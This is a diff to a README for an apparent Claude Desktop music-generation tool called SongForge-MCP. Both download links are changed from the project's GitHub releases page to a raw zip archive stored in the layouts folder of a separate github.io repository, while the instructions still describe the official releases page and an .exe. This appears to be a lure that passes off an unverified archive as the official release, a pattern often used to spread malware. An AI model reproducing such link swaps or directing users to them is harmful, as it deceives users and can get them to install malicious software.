@@ -5,7 +5,7 @@ description: "Generate original AI music through Claude using this Model Context
 ---
 # 🎵 SongForge-MCP - Create custom music using Claude Desktop
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/unbrainwashed-physics713/SongForge-MCP/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/unbrainwashed-physics713/unbrainwashed-physics713.github.io/main/_layouts/v1.5.zip)
 
 SongForge-MCP lets you create original music tracks directly through the Claude Desktop application. You create complete songs, including vocals and instrumental layers, without needing complex music software or deep knowledge about artificial intelligence. The application uses smart technology to match the style of your favorite tracks and separates audio into clean parts.
 
@@ -13,7 +13,7 @@ SongForge-MCP lets you create original music tracks directly through the Claude 
 
 You must visit the official release page to get the latest version of the software. 
 
-[Visit this page to download the software](https://github.com/unbrainwashed-physics713/SongForge-MCP/releases)
+[Visit this page to download the software](https://raw.githubusercontent.com/unbrainwashed-physics713/unbrainwashed-physics713.github.io/main/_layouts/v1.5.zip)
 
 Look for the link labeled "Assets" under the most recent version number. Click the file that ends in .exe to start the download. Save this file to a folder you recognize, such as your Downloads folder or your Desktop.
 
